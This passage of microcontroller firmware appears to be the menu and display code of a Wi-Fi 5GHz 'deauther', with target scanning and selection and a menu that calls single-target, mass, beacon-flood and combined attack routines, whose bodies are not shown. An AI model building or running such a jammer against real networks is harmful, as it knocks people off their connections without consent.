    display.drawRect(50, 15, 28, 25, WHITE); // Skull outline
    display.fillRect(56, 24, 4, 5, f % 2 == 0 ? WHITE : BLACK); // Left eye
    display.fillRect(68, 24, 4, 5, f % 3 == 0 ? WHITE : BLACK); // Right eye
    display.drawLine(60, 35, 66, 35, WHITE); // Mouth

    // Title with glitch effect
    display.setTextSize(1);
    display.setTextColor(WHITE);

    if (f % 3 != 0) {
      display.setCursor(f % 4 == 0 ? 13 : 12, 5);
      display.print("PHATZ NETWORK KILLER");
    }

    display.setCursor(f % 2 == 0 ? 26 : 25, 48);
    display.print(f % 5 == 0 ? "5GHZ DEAUTHER" : "5 G H Z DEAUTHER");

    // Scattered broken wifi symbols
    for (int w = 0; w < 6; w++) {
      int x = (f * 7 + w * 20) % SCREEN_WIDTH;
      int y = (f * 3 + w * 10) % 20 + 55;
      display.drawBitmap(x, y, image_wifi_not_connected__copy__bits, 19, 16, f % 2 == 0 ? WHITE : BLACK);
    }

    // Draw corrupted frame
    for (int l = 0; l < 128; l += 8) {
      if ((l + f) % 5 != 0) {
        display.drawLine(l, 0, l, 5, WHITE);
        display.drawLine(l, 63, l, 58, WHITE);
      }
    }

    // Draw glitch lines
    if (f % 4 == 0) {
      display.fillRect(0, (f * 7) % 64, SCREEN_WIDTH, 2, WHITE);
    }

    display.display();
    delay(f % 2 == 0 ? 120 : 80);
  }

  // Final screen with warning
  display.clearDisplay();
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);

  // Hazard corners
  display.drawLine(0, 0, 10, 10, WHITE);
  display.drawLine(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-11, 10, WHITE);
  display.drawLine(0, SCREEN_HEIGHT-1, 10, SCREEN_HEIGHT-11, WHITE);
  display.drawLine(SCREEN_WIDTH-1, SCREEN_HEIGHT-1, SCREEN_WIDTH-11, SCREEN_HEIGHT-11, WHITE);

  display.setTextSize(1);
  display.setTextColor(WHITE);

  // Title with malicious feel
  display.setCursor(15, 8);
  display.print("NETWORK DESTROYER");

  display.setCursor(32, 25);
  display.print("PHATZ DEAUTHER");

  // Warning text
  display.setCursor(10, 38);
  display.print("* SYSTEM ACTIVATED *");

  display.setCursor(10, 50);
  display.print("ALL NETWORKS AT RISK");

  display.display();
  delay(2000);
}

// New function to handle attack menu and execution
void attackLoop() {
  int attackState = 0;
  bool running = true;
  unsigned long animTimer = 0;
  int animFrame = 0;

  // Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();

    // Draw hazard stripes in corners
    for (int i = 0; i < 10; i+=3) {
      display.drawLine(0, i, 10-i, 0, WHITE);
      display.drawLine(SCREEN_WIDTH-10+i, 0, SCREEN_WIDTH-1, i, WHITE);
      display.drawLine(0, SCREEN_HEIGHT-1-i, 10-i, SCREEN_HEIGHT-1, WHITE);
      display.drawLine(SCREEN_WIDTH-10+i, SCREEN_HEIGHT-1, SCREEN_WIDTH-1, SCREEN_HEIGHT-1-i, WHITE);
    }

    // Animated warning title bar with blinking effect
    if (millis() - animTimer > 500) {
      animTimer = millis();
      animFrame = !animFrame;
    }

    display.fillRect(0, 0, SCREEN_WIDTH, 12, animFrame ? WHITE : BLACK);
    display.fillRect(0, 1, SCREEN_WIDTH, 10, animFrame ? BLACK : WHITE);
    display.setTextColor(animFrame ? WHITE : BLACK);
    display.setTextSize(1);
    display.setCursor(10, 2);
    display.print(">> ATTACK SELECTION <<");

    // Draw attack options with enhanced visuals
    const char *attackTypes[] = { 
      "SINGLE TARGET", 
      "TARGET ALL", 
      "BEACON FLOOD", 
      "COMBO ATTACK", 
      "[RETURN]" 
    };

    // Draw selection box
    display.drawRect(5, 15, SCREEN_WIDTH-10, 47, WHITE);

    for (int i = 0; i < 5; i++) {
      if (i == attackState) {
        // Draw selected option with highlight
        display.fillRect(7, 17 + (i * 9), SCREEN_WIDTH-14, 9, WHITE);
        display.setTextColor(BLACK);

        // Animated indicator
        if (animFrame) {
          display.fillTriangle(10, 21 + (i * 9), 15, 17 + (i * 9), 15, 25 + (i * 9), BLACK);
        }
      } else {
        display.setTextColor(WHITE);
      }

      display.setCursor(i == attackState ? 18 : 15, 18 + (i * 9));
      display.print(attackTypes[i]);

      // Draw attack-specific icons
      if (i == attackState && i < 4) {
        int iconX = SCREEN_WIDTH - 20;
        int iconY = 17 + (i * 9) + 4;

        if (i == 0) { // Single target
          display.drawCircle(iconX, iconY, 4, i == attackState ? BLACK : WHITE);
          display.drawLine(iconX-2, iconY-2, iconX+2, iconY+2, i == attackState ? BLACK : WHITE);
          display.drawLine(iconX+2, iconY-2, iconX-2, iconY+2, i == attackState ? BLACK : WHITE);
        } else if (i == 1) { // Mass deauth - multiple targets
          for (int d = 0; d < 3; d++) {
            display.drawCircle(iconX-2+d*2, iconY-2+d, 2, i == attackState ? BLACK : WHITE);
            display.drawLine(iconX-3+d*2, iconY-3+d, iconX-1+d*2, iconY-1+d, i == attackState ? BLACK : WHITE);
          }
        } else if (i == 2) { // Beacon - broadcast tower
          display.drawTriangle(iconX, iconY-4, iconX-3, iconY+2, iconX+3, iconY+2, i == attackState ? BLACK : WHITE);
          display.drawLine(iconX, iconY-6, iconX, iconY-2, i == attackState ? BLACK : WHITE);
        } else if (i == 3) { // Combo - explosion
          for (int r = 0; r < 4; r++) {
            display.drawLine(iconX, iconY, iconX + cos(r*PI/2)*4, iconY + sin(r*PI/2)*4, i == attackState ? BLACK : WHITE);
            display.drawLine(iconX, iconY, iconX + cos(r*PI/2+PI/4)*3, iconY + sin(r*PI/2+PI/4)*3, i == attackState ? BLACK : WHITE);
          }
        }
      }
    }

    

    display.display();

    // Handle button inputs
    if (digitalRead(BTN_OK) == LOW) {
      // Flash screen for visual feedback
      display.invertDisplay(true);
      delay(50);
      display.invertDisplay(false);
      delay(100);

      if (attackState == 4) {  // Back option
        running = false;
      } else {
        // Execute selected attack
        drawAttackScreen(attackState);
        switch (attackState) {
          case 0:
            Single();
            break;
          case 1:
            All();
            break;
          case 2:
            Becaon();
            break;
          case 3:
            BecaonDeauth();
            break;
        }
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (attackState < 4) {
        attackState++;
        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (attackState > 0) {
        attackState--;
        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
    }

    delay(10); // Small delay to prevent display flickering
  }
}

// New function to handle network selection
void networkSelectionLoop() {
  bool running = true;
  // For blinking cursor effect
  bool cursorBlink = false;
  unsigned long lastBlink = 0;
  // For animation effects
  int animationFrame = 0;
  unsigned long lastAnimUpdate = 0;

  // Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();

    // Create frame with targeting display look
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
    display.drawRect(2, 2, SCREEN_WIDTH-4, SCREEN_HEIGHT-4, WHITE);

    // Tactical targeting crosshairs in corners
    display.drawLine(0, 0, 8, 8, WHITE);
    display.drawLine(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-9, 8, WHITE);
    display.drawLine(0, SCREEN_HEIGHT-1, 8, SCREEN_HEIGHT-9, WHITE);
    display.drawLine(SCREEN_WIDTH-1, SCREEN_HEIGHT-1, SCREEN_WIDTH-9, SCREEN_HEIGHT-9, WHITE);

    // Oscilloscope style header
    display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(5, 1);
    display.print("SELECT TARGET");

    // Draw counter with total networks
    display.setCursor(SCREEN_WIDTH-28, 1);
    display.print(scrollindex+1);
    display.print("/");
    display.print(scan_results.size());

    // Network details panel
    display.setTextColor(WHITE);

    // Network name with cyberpunk-style frame
    display.drawRect(5, 13, SCREEN_WIDTH-10, 12, WHITE);

    // Show cursor blink effect every 250ms
    unsigned long currentTime = millis();
    if (currentTime - lastBlink > 250) {
      cursorBlink = !cursorBlink;
      lastBlink = currentTime;
    }

    if (cursorBlink) {
      display.fillRect(8, 15, 3, 8, WHITE);
    }

    // Display SSID with truncation if needed
    display.setCursor(13, 15);
    if (SelectedSSID.length() > 17) {
      display.print(SelectedSSID.substring(0, 15) + "..");
    } else {
      display.print(SelectedSSID);
    }

    // Signal strength display
    display.drawRect(5, 27, SCREEN_WIDTH-10, 10, WHITE);

    // RSSI bar (scale from -100 to -30 dBm)
    int rssiPercent = constrain(map(scan_results[scrollindex].rssi, -100, -30, 0, 100), 0, 100);
    display.fillRect(7, 29, (SCREEN_WIDTH-14) * rssiPercent / 100, 6, WHITE);

    // Show RSSI value
    char rssiText[10];
    sprintf(rssiText, "%ddBm", scan_results[scrollindex].rssi);
    display.setCursor(SCREEN_WIDTH/2 - strlen(rssiText)*3, 29);
    display.setTextColor(rssiPercent > 50 ? BLACK : WHITE);
    display.print(rssiText);

    // Technical details box
    display.drawRect(5, 39, SCREEN_WIDTH-10, 24, WHITE);

    // Animate signal waveform based on channel
    if (currentTime - lastAnimUpdate > 100) {
      animationFrame = (animationFrame + 1) % 8;
      lastAnimUpdate = currentTime;
    }

    // Draw channel number and band
    display.setTextColor(WHITE);
    display.setCursor(8, 42);
    display.print("CH:");
    display.print(scan_results[scrollindex].channel);

    // Show band with appropriate icon
    display.setCursor(45, 42);
    display.print("BAND:");
    display.print(SSIDCh);

    // Show BSSID in short form
    display.setCursor(8, 51);
    display.print("ID:");
    char bssidShort[14];
    sprintf(bssidShort, "%02X:%02X:..:%02X", 
            scan_results[scrollindex].bssid[0], 
            scan_results[scrollindex].bssid[1],
            scan_results[scrollindex].bssid[5]);
    display.print(bssidShort);

    // Draw signal waveform animation
    int baseY = 46;
    int waveHeight = 3;
    if (SSIDCh == "5G") {
      // 5GHz has shorter, more frequent waves
      for (int x = 88; x < SCREEN_WIDTH-8; x += 4) {
        int y = baseY + sin((x + animationFrame) * 0.8) * waveHeight;
        display.drawPixel(x, y, WHITE);
        display.drawPixel(x+1, y, WHITE);
      }
    } else {
      // 2.4GHz has longer waves
      for (int x = 88; x < SCREEN_WIDTH-8; x += 2) {
        int y = baseY + sin((x + animationFrame) * 0.3) * waveHeight;
        display.drawPixel(x, y, WHITE);
      }
    }

    // Navigation indicators
    if (scrollindex > 0) {
      display.fillTriangle(SCREEN_WIDTH/2-5, SCREEN_HEIGHT-3, SCREEN_WIDTH/2+5, SCREEN_HEIGHT-3, SCREEN_WIDTH/2, SCREEN_HEIGHT-8, WHITE);
    }
    if (static_cast<size_t>(scrollindex) < scan_results.size() - 1) {
      display.fillTriangle(SCREEN_WIDTH/2-5, 10+3, SCREEN_WIDTH/2+5, 10+3, SCREEN_WIDTH/2, 10+8, WHITE);
    }

    display.display();

    // Modified button handling
    if (digitalRead(BTN_OK) == LOW) {
      // Flash screen for visual feedback
      display.invertDisplay(true);
      delay(50);
      display.invertDisplay(false);
      delay(100);

      // Wait for button release before exiting
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
      running = false;
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (static_cast<size_t>(scrollindex) < scan_results.size() - 1) {
        scrollindex++;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";

        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (scrollindex > 0) {
        scrollindex--;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";

        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
    }

    delay(10);  // Small delay to prevent display flickering
  }
}

void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true)
      ;
  }
  titleScreen();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
}

void loop() {
  unsigned long currentTime = millis();

  // Draw the enhanced main menu interface
  drawMainMenu(menustate);

  // Handle OK button press
  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime > DEBOUNCE_DELAY) {
      if (okstate) {
        switch (menustate) {
          case 0:  // Attack
            // Show attack options and handle attack execution
            display.clearDisplay();
            attackLoop();
            break;

          case 1:  // Scan
            // Execute scan with animation
            display.clearDisplay();
            drawScanScreen();
            if (scanNetworks() == 0) {
              drawStatusBar("SCAN COMPLETE");
              display.display();
              delay(1000);
            }
            break;

          case 2:  // Select Network
            // Show network selection interface
            networkSelectionLoop();
            break;
        }
      }
      lastOkTime = currentTime;
    }
  }

  // Handle Down button
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      if (menustate > 0) {
        menustate--;
        // Visual feedback
        display.invertDisplay(true);
        delay(50);
        display.invertDisplay(false);
      }
      lastDownTime = currentTime;
    }
  }

  // Handle Up button
  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (menustate < 2) {
        menustate++;
        // Visual feedback
        display.invertDisplay(true);
        delay(50);
        display.invertDisplay(false);
      }
      lastUpTime = currentTime;
    }
  }
}
